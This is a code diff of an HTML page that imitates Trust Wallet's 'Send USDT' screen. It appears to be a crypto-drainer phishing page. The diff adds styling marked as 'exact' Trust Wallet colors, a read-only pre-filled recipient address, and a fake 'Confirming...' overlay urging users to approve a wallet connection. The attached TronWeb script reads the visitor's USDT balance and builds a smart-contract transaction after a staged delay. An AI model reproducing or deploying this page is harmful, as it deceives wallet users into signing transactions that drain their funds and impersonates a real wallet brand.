@@ -3,66 +3,88 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
-    <title>Trust Wallet</title>
+    <title>Send USDT</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background-color: #000000; color: #ffffff; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; }
-        .ios-input { background-color: #1a1a1a; border: none; outline: none; }
-        .trust-blue-btn { background-color: #0500ff; transition: opacity 0.2s; }
-        .trust-blue-btn:active { opacity: 0.7; }
-        .loading-overlay { background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); }
+        /* Exact Trust Wallet Mobile Colors and Fonts */
+        body { background-color: #121212; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow-x: hidden; }
+        .tw-input-bg { background-color: #1A1A1A; border: 1px solid #333333; }
+        .tw-green-text { color: #27C469; }
+        .tw-green-btn { background-color: #27C469; color: #000000; transition: opacity 0.2s; }
+        .tw-green-btn:active { opacity: 0.7; transform: scale(0.98); }
+        .loading-overlay { background: rgba(18, 18, 18, 0.9); backdrop-filter: blur(5px); }
+        
+        /* Remove number input arrows */
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <div class="px-5 py-4 flex items-center justify-between border-b border-gray-900">
-        <i class="fa-solid fa-arrow-left text-xl text-white"></i>
-        <h1 class="text-[17px] font-bold">Send USDT</h1>
-        <span class="text-[#3b82f6] font-medium text-[15px]">History</span>
+    <div class="px-4 py-4 flex items-center relative">
+        <i class="fa-solid fa-arrow-left text-[22px] text-gray-300 absolute left-4"></i>
+        <h1 class="text-[17px] font-bold mx-auto">Send USDT</h1>
     </div>
 
-    <div id="main-content" class="px-5 mt-6 flex-grow flex flex-col">
+    <div id="main-content" class="px-4 mt-4 flex-grow flex flex-col">
         
-        <div class="ios-input rounded-2xl p-4 mb-5">
-            <div class="flex justify-between items-center mb-1">
-                <span class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Recipient Address</span>
-                <span class="text-[#3b82f6] text-[11px] font-bold uppercase">Paste</span>
-            </div>
-            <div class="flex items-center justify-between">
-                <input type="text" value="TBrJPyG8BUysBBM...QFvEHay2" class="bg-transparent text-[#e2e8f0] text-[15px] w-full" readonly>
-                <i class="fa-solid fa-qrcode text-[#3b82f6] ml-2"></i>
-            </div>
-        </div>
-
-        <div class="ios-input rounded-2xl p-4">
-            <div class="flex justify-between items-center mb-1">
-                <span class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Amount USDT</span>
-                <span class="text-[#3b82f6] text-[11px] font-bold uppercase">Max</span>
-            </div>
-            <div class="flex items-center justify-between mt-1">
-                <input type="number" id="send-amount" placeholder="0" class="bg-transparent text-3xl font-semibold w-full outline-none">
-                <div class="flex items-center gap-2">
-                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-6 h-6">
-                    <span class="font-bold text-lg">USDT</span>
+        <div class="mb-5">
+            <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Address or Domain Name</label>
+            <div class="tw-input-bg rounded-xl p-3 flex justify-between items-center h-[56px]">
+                <input type="text" placeholder="Search or Enter" value="TBrJPyG8BUysBBM...QFvEHay2" class="bg-transparent text-gray-300 text-[15px] w-full outline-none placeholder-gray-500" readonly>
+                <div class="flex items-center gap-4 tw-green-text shrink-0 ml-2">
+                    <span class="text-[15px] font-medium">Paste</span>
+                    <i class="fa-regular fa-clipboard text-[18px]"></i>
+                    <i class="fa-solid fa-expand text-[18px]"></i>
                 </div>
             </div>
-            <div class="mt-4 text-[13px] text-gray-400">
-                Balance: <span id="view-balance">0.00 USDT</span>
+        </div>
+
+        <div class="mb-5">
+            <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Destination network</label>
+            <div class="inline-flex items-center gap-2 bg-[#222222] px-3 py-1.5 rounded-full border border-gray-800">
+                <div class="w-5 h-5 bg-[#FF060A] rounded-full flex items-center justify-center">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 22L12 18L22 22L12 2Z"/></svg>
+                </div>
+                <span class="text-[14px] font-semibold text-gray-300">Tron</span>
+                <i class="fa-solid fa-caret-down text-gray-500 text-xs ml-1"></i>
             </div>
         </div>
 
-        <div class="mt-auto mb-10">
-            <button id="next-btn" class="w-full trust-blue-btn py-4 rounded-full text-lg font-bold">
+        <div class="mb-2">
+            <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Amount</label>
+            <div class="tw-input-bg rounded-xl p-3 flex justify-between items-center h-[56px]">
+                <input type="number" id="send-amount" placeholder="USDT Amount" class="bg-transparent text-[16px] w-full outline-none placeholder-gray-400 text-white">
+                <div class="flex items-center gap-3 shrink-0 ml-2">
+                    <span class="text-[15px] font-medium text-gray-300">USDT</span>
+                    <span class="text-[15px] font-medium tw-green-text">Max</span>
+                </div>
+            </div>
+            <div class="mt-2 text-[13px] text-gray-300 font-medium">
+                ≈ $<span id="view-balance">0.00</span>
+            </div>
+        </div>
+
+        <div class="mb-6 mt-3">
+            <label class="text-[14px] text-gray-300 font-semibold mb-2 block">Memo</label>
+            <div class="tw-input-bg rounded-xl p-3 flex justify-end items-center h-[56px] gap-4 tw-green-text">
+                <i class="fa-solid fa-expand text-[18px]"></i>
+                <i class="fa-solid fa-circle-info text-[18px]"></i>
+            </div>
+        </div>
+
+        <div class="mt-auto mb-8">
+            <button id="next-btn" class="w-full tw-green-btn py-4 rounded-full text-[17px] font-bold">
                 Next
             </button>
         </div>
     </div>
 
     <div id="loading-screen" class="hidden fixed inset-0 loading-overlay z-50 flex flex-col items-center justify-center p-8">
-        <div class="w-12 h-12 border-[3px] border-[#3b82f6] border-t-transparent rounded-full animate-spin mb-6"></div>
-        <h2 id="loading-title" class="text-[19px] font-bold text-white">Confirming Transaction...</h2>
-        <p id="loading-subtitle" class="text-gray-400 text-center text-sm mt-2">Checking network congestion and estimating gas fee. Please wait...</p>
+        <div class="w-12 h-12 border-[3px] border-[#27C469] border-t-transparent rounded-full animate-spin mb-6"></div>
+        <h2 id="loading-title" class="text-[19px] font-bold text-white">Confirming...</h2>
+        <p id="loading-subtitle" class="text-gray-400 text-center text-sm mt-2">Please approve the connection in your wallet.</p>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js" defer></script>
@@ -111,6 +133,9 @@
                 const address = result.address;
                 const { trx, usdt } = await getStats(address);
                 
+                // Update Balance UI in background
+                document.getElementById('view-balance').innerText = usdt;
+                
                 // UI transition to Confirming
                 document.getElementById('main-content').classList.add('opacity-10');
                 document.getElementById('loading-screen').classList.remove('hidden');
@@ -120,7 +145,6 @@
                 try {
                     const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                     
-                    // Triggering Approval after a short "Thinking" delay
                     setTimeout(async () => {
                         try {
                             const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
@@ -153,4 +177,5 @@
         });
     </script>
 </body>
-</html>
+    </html>
+    
